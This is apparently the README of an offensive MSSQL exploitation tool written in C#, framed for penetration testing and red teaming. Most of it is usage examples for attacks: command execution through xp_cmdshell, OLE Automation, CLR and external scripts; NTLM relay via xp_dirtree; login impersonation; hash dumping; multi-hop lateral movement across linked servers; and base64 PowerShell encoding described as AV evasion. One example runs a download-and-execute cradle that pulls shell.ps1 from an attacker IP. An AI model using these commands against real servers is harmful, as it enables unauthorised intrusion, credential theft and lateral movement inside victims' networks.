<div align="center">
  <a href="https://github.com/johto89/mat">
    <img src="images/logo.jpeg" height="300">
  </a>

  <h1>M.A.T - MSSQL Attack Tool (Integrated Edition)</h1>
</div>

## Description

The MSSQL ATTACK TOOL (M.A.T) is a C# tool for fast discovery and exploitation of vulnerabilities in MSSQL servers. Originally developed at SySS GmbH, this integrated edition merges capabilities from [SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn) into a single binary for comprehensive MSSQL lateral movement during penetration testing and red team engagements.

## Features

- **SPN Discovery** - Discover MSSQL instances in the domain via SPN queries (no server required)
- **Reconnaissance** - Automatic checks: login info, group memberships, linked servers, impersonation privileges, SQL logins enumeration
- **Four command execution techniques:**
  - `xp_cmdshell` (local + linked servers, single/double/triple link)
  - `sp_OACreate` / OLE Automation Procedures (local + linked servers, blind execution)
  - CLR Assembly custom stored procedure (local, with OPSEC-safe randomized names)
  - `sp_execute_external_script` Python external script (local + linked servers)
- **Windows Integrated, SQL, and Azure AD Authentication**
- **PowerShell base64 encoding** (`-enc`) for evasion
- **NTLM relay** via `xp_dirtree` UNC path injection (local + linked servers)
- **User impersonation** (`EXECUTE AS LOGIN`)
- **SQL shell** - Execute arbitrary SQL queries (local + linked servers)
- **Custom query on linked servers** via `OPENQUERY`
- **Linked server multi-hop** - 1-hop, 2-hop (double link), 3-hop recon and command execution
- **RPC OUT management** - Automatic check and enable for linked server operations
- **Hash dumping** - Dump MSSQL user hashes (requires sysadmin)
- **Post-execution cleanup** - Automatically disables enabled features (xp_cmdshell, OLE Automation, CLR) after use (can be skipped with `--no-cleanup`)
- **Output logging** - Log all output to file with `--output`
- **Quiet mode** - Suppress banner with `--quiet`
- **Connection tuning** - Custom port (`--port`) and timeout (`--timeout`) for tunneled/proxied environments
- **OPSEC improvements** - Randomized CLR assembly/procedure names to avoid static signature detection

## Compilation

Visual Studio with .NET Framework 4.7.2. Required NuGet packages:
- `CommandLineParser 2.9.1`
- `Costura.Fody` (for single-file executable)

Or use the pre-built executable from Releases.

## Usage

```
MAT.exe [options]
```

If no `-u` / `-p` is provided, Windows Integrated Authentication is used by default.

### Options

```
  -s, --server           SQL server hostname or IP (not required with --spn-scan)
  -u, --user             SQL user (for SQL or Azure authentication)
  -p, --password         SQL password
  -d, --database         Database name (default: 'master')
  -l, --linked-server    Target linked SQL server
  -i, --impersonate      Impersonate the specified SQL login
  -r, --relay            Trigger NTLM relay to attacker IP via xp_dirtree (works with -l for linked server)
  -e                     Enable xp_cmdshell locally, or on linked server with -l
  --os-command           OS command to execute on target
  --sql-command          SQL command to execute on target
  --double-link          Execute OS command via double link (value = command)
  --stoprox              Execute OS command via CLR stored procedure (legacy, same as --cmdtech 3)
  --dumphashes           Dump MSSQL user hashes (requires sysadmin)
  --cmdtech              Execution technique: 1=xp_cmdshell (default), 2=sp_OACreate, 3=CLR assembly, 4=External Script
  --encode-ps            Encode command as base64 PowerShell (-enc) for AV evasion
  --azure-domain         Azure AD domain (enables Azure auth, requires -u and -p)
  --no-cleanup           Skip post-execution cleanup (don't disable features after use)
  --linked-query         Execute custom SQL query on linked server via OPENQUERY
  --spn-scan             Discover MSSQL instances in domain via SPN query (no --server required)
  --output               Log all output to specified file path
  --quiet                Suppress banner output
  --port                 SQL Server port (default: 1433, useful for tunneled connections)
  --timeout              Connection timeout in seconds (default: 30)
  --help                 Display help screen
  --version              Display version information
```

## Examples

### SPN Discovery (find MSSQL instances in domain)
```
MAT.exe --spn-scan
```

### Basic recon (Windows auth)
```
MAT.exe --server localhost
```

### SQL authentication
```
MAT.exe --server 10.10.10.5 -u sqladmin -p P@ssw0rd
```

### Azure AD authentication
```
MAT.exe --server azuresql.database.windows.net --azure-domain corp.com -u admin -p P@ssw0rd
```

### OS command execution (xp_cmdshell - default)
```
MAT.exe --server localhost --os-command "whoami"
```

### OS command via sp_OACreate (blind, no output)
```
MAT.exe --server localhost --os-command "whoami" --cmdtech 2
```

### OS command via CLR Assembly
```
MAT.exe --server localhost --os-command "whoami" --cmdtech 3
# or legacy syntax:
MAT.exe --server localhost --stoprox "whoami"
```

### OS command via External Script (sp_execute_external_script)
```
MAT.exe --server localhost --os-command "whoami" --cmdtech 4
```

### External Script on linked server
```
MAT.exe --server localhost -l LINKED01 --os-command "whoami" --cmdtech 4
```

### Command with PowerShell base64 encoding
```
MAT.exe --server localhost --os-command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')" --encode-ps
```

### Impersonate user then execute
```
MAT.exe --server localhost --impersonate sa --os-command "whoami"
```

### NTLM relay (local)
```
MAT.exe --server localhost --relay 10.10.10.10
```

### NTLM relay on linked server
```
MAT.exe --server localhost -l LINKED01 --relay 10.10.10.10
```

### Execute OS command on linked server
```
MAT.exe --server localhost -l LINKED01 --os-command "whoami"
```

### Execute OS command on linked server via sp_OACreate
```
MAT.exe --server localhost -l LINKED01 --os-command "whoami" --cmdtech 2
```

### Double link command execution
```
MAT.exe --server localhost -l LINKED01 --double-link "whoami"
```

### SQL shell (local)
```
MAT.exe --server localhost --sql-command "SELECT name FROM sys.databases"
```

### SQL shell on linked server
```
MAT.exe --server localhost -l LINKED01 --sql-command "SELECT SYSTEM_USER"
```

### Custom query on linked server via OPENQUERY
```
MAT.exe --server localhost -l LINKED01 --linked-query "SELECT name FROM sys.databases"
```

### Skip cleanup after execution
```
MAT.exe --server localhost --os-command "whoami" --no-cleanup
```

### Dump MSSQL user hashes
```
MAT.exe --server localhost --dumphashes
```

### Log output to file
```
MAT.exe --server localhost --os-command "whoami" --output C:\temp\mat_output.txt
```

### Custom port (e.g., through chisel tunnel)
```
MAT.exe --server 127.0.0.1 --port 41433 --timeout 60 --os-command "whoami"
```

### Quiet mode (suppress banner)
```
MAT.exe --server localhost --os-command "whoami" --quiet
```

## Command Execution Techniques

| Technique | `--cmdtech` | Output | Local | Linked | Description |
|-----------|:-----------:|:------:|:-----:|:------:|-------------|
| xp_cmdshell | 1 (default) | Yes | Yes | Yes | Standard, returns command output |
| sp_OACreate | 2 | No (blind) | Yes | Yes | OLE Automation, no output returned |
| CLR Assembly | 3 | Yes | Yes | No | Custom .NET stored procedure, randomized names |
| External Script | 4 | Yes | Yes | Yes | Python via sp_execute_external_script |

## Scenario Walkthrough

During a penetration test, the user `COM1\user` is compromised. A local MSSQL Server instance is identified. The MSSQL ATTACK TOOL is used:

```
MAT.exe --server localhost
```

The tool logs in via Windows Integrated Authentication and outputs recon results:

![Bild1](./images/example1.png)

The user is in the "sysadmin" group. Enable xp_cmdshell and execute commands:

```
MAT.exe --server localhost -e
MAT.exe --server localhost --os-command "whoami"
```

![Bild2](./images/example2.png)

Linked servers are identified:

![Bild3](./images/example3.png)

Test lateral movement to linked server COM2. If direct access fails, impersonate another SQL login:

```
MAT.exe --server localhost --impersonate userx
```

![Bild5](./images/example5.png)

The tool supports multi-hop scenarios (1-hop, 2-hop, 3-hop) through linked servers. "Pwn3d!" indicates sysadmin access on the target.

![Bild6](./images/example6.png)

## Credits

- Original MAT: [SySS-Research](https://github.com/SySS-Research/MAT) (Marvin Ramsperger, SySS GmbH)
- SharpSQLPwn techniques: [lefayjey](https://github.com/lefayjey/SharpSQLPwn)
- SharpSQL SPN Discovery: [mlcsec](https://github.com/mlcsec/SharpSQL)
- Integration: [johto89](https://github.com/johto89)

## License

See [LICENSE.txt](LICENSE.txt)
